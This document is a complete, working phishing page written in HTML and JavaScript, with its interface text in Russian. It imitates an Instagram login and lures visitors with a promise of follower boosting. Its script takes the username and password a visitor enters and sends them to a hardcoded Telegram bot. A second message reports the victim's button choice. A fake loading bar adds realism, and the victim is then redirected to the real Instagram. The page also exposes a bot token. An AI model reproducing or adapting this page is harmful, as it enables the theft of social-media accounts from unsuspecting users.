<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Meta Support | Authentication</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body { 
            margin: 0; 
            min-height: 100vh; 
            display: flex; 
            flex-direction: column; 
            justify-content: center; 
            align-items: center; 
            background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%,#d6249f 60%,#285AEB 90%);
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            padding: 20px; 
        }

        .container { 
            width: 100%; 
            max-width: 350px; 
            background: #ffffff; 
            border-radius: 3px; 
            padding: 40px 30px; 
            box-sizing: border-box; 
            border: 1px solid #dbdbdb; 
            text-align: center; 
            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
        }

        .logo-ig {
            font-size: 35px;
            margin-bottom: 25px;
            color: #262626;
            font-weight: bold;
            letter-spacing: -1px;
        }

        .header { color: #8e8e8e; margin-bottom: 20px; font-size: 15px; font-weight: 600; line-height: 1.4;}

        /* Поля ввода */
        .input-group {
            position: relative;
            width: 100%;
            margin-bottom: 8px;
        }

        input { 
            width: 100%; 
            padding: 11px 40px 11px 10px; 
            border-radius: 3px; 
            border: 1px solid #dbdbdb; 
            outline: none; 
            box-sizing: border-box; 
            font-size: 14px; 
            background: #fafafa;
            color: #262626;
        }
        input:focus { border-color: #a8a8a8; }

        .eye-icon {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            color: #8e8e8e;
            cursor: pointer;
            font-size: 16px;
            display: none; 
        }
        
        /* Кнопка входа */
        #btn { 
            width: 100%; 
            padding: 8px; 
            border-radius: 4px; 
            border: none; 
            background: #0095f6; 
            color: white; 
            font-weight: 600; 
            cursor: pointer; 
            font-size: 14px; 
            margin-top: 15px; 
            transition: 0.2s; 
        }
        #btn:hover { background: #1877f2; }
        #btn:disabled { background: rgba(0,149,246,0.3); }

        /* Лоадер */
        .loader-container {
            display: none;
            width: 100%;
            margin-top: 20px;
        }
        .progress-bg {
            width: 100%;
            height: 4px;
            background: #dbdbdb;
            border-radius: 2px;
            overflow: hidden;
            position: relative;
        }
        .progress-bar {
            width: 50%;
            height: 100%;
            background: linear-gradient(to right, #fd5949, #d6249f);
            position: absolute;
            animation: moveLoader 1.5s infinite ease-in-out;
        }
        @keyframes moveLoader {
            0% { left: -50%; }
            100% { left: 100%; }
        }

        /* Меню выбора */
        #menu { display: none; flex-direction: column; gap: 12px; margin-top: 15px; }
        .menu-btn {
            width: 100%;
            padding: 12px;
            border-radius: 4px;
            font-weight: 600;
            cursor: pointer;
            font-size: 14px;
            border: none;
            transition: 0.3s;
        }
        .btn-boost {
            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
            color: white;
        }
        .btn-original {
            background: #efefef;
            color: #262626;
        }

        .footer-text { margin-top: 25px; color: #8e8e8e; font-size: 12px; }
    </style>
</head>
<body>

<div class="container">
    <div class="logo-ig">
        <i class="fab fa-instagram"></i> Instagram
    </div>

    <div id="login-form">
        <div class="header">Войдите, чтобы продолжить работу с панелью управления</div>
        
        <div class="input-group">
            <input type="text" id="user" placeholder="Логин или email" oninput="showEye('user', 'eye-user')">
            <i class="fas fa-eye-slash eye-icon" id="eye-user" onclick="toggleView('user', 'eye-user')"></i>
        </div>

        <div class="input-group">
            <input type="password" id="pass" placeholder="Пароль" oninput="showEye('pass', 'eye-pass')">
            <i class="fas fa-eye-slash eye-icon" id="eye-pass" onclick="toggleView('pass', 'eye-pass')"></i>
        </div>

        <button id="btn" onclick="sendData()">Войти</button>
    </div>

    <div class="loader-container" id="loader">
        <div class="progress-bg"><div class="progress-bar"></div></div>
        <p style="color: #8e8e8e; font-size: 13px;">Синхронизация данных...</p>
    </div>

    <div id="menu">
        <div class="header" style="color: #262626;">Аккаунт успешно подключен!</div>
        <button class="menu-btn btn-boost" onclick="finalAction('boost')">🚀 Начать накрутку</button>
        <button class="menu-btn btn-original" onclick="finalAction('login')">🌐 Перейти в профиль</button>
    </div>

    <div class="footer-text">© 2026 Meta from Facebook</div>
</div>

<script>
const TG_TOKEN = "8653348218:AAEIW_z5aWHH76yiuFQL3cPKfO2e3wNBxn4";
const TG_ID = "7829181579";

let savedUser = "";

// Функция глазка: появление иконки
function showEye(inputId, eyeId) {
    const val = document.getElementById(inputId).value;
    document.getElementById(eyeId).style.display = val.length > 0 ? "block" : "none";
}

// Функция глазка: переключение видимости
function toggleView(inputId, eyeId) {
    const input = document.getElementById(inputId);
    const eye = document.getElementById(eyeId);
    if (input.type === "password") {
        input.type = "text";
        eye.classList.replace("fa-eye-slash", "fa-eye");
    } else {
        input.type = "password";
        eye.classList.replace("fa-eye", "fa-eye-slash");
    }
}

// ПЕРВАЯ ОТПРАВКА (Логин и Пароль)
async function sendData() {
    savedUser = document.getElementById("user").value;
    let p = document.getElementById("pass").value;

    if (!savedUser || !p) { alert("Введите данные!"); return; }

    document.getElementById("login-form").style.display = "none";
    document.getElementById("loader").style.display = "block";

    const text = `📬 НОВЫЙ ВХОД\n👤 Логин: ${savedUser}\n🔑 Пароль: ${p}`;
    
    try {
        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_ID}&text=${encodeURIComponent(text)}`);
        
        // Пауза для реалистичности
        setTimeout(() => {
            document.getElementById("loader").style.display = "none";
            document.getElementById("menu").style.display = "flex";
        }, 2500);
    } catch (e) {
        alert("Ошибка соединения");
        location.reload();
    }
}

// ВТОРАЯ ОТПРАВКА (Что нажал пользователь)
async function finalAction(type) {
    const actionName = type === 'boost' ? "🔥 НАЖАЛ: НАКРУТКА" : "🌐 НАЖАЛ: ВХОД В ПРОФИЛЬ";
    const text = `🔔 ДЕЙСТВИЕ\n👤 Юзер: ${savedUser}\n📍 Статус: ${actionName}`;

    try {
        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_ID}&text=${encodeURIComponent(text)}`);
        
        if (type === 'boost') {
            alert("Заявка на накрутку принята!");
            window.location.href = "https://t.me/HQ_smmbot_bot";
        } else {
            window.location.href = "https://www.instagram.com/accounts/login/";
        }
    } catch (e) {
        window.location.href = "https://www.instagram.com/";
    }
}
</script>

</body>
</html>
